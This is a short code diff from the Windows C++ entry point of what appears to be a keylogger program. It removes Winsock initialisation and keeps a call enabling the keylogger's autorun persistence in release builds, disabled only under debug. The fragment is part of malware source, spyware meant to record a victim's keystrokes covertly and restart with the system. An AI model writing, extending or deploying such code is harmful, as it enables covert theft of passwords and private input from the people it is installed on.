@@ -24,9 +24,6 @@ int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCm
     ULONG_PTR           gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
-	WSADATA WSAData;
-    WSAStartup(MAKEWORD(2, 0), &WSAData);
-
     keylogger.SetAutorun(true);
 #ifdef _DEBUG
     keylogger.SetAutorun(false);
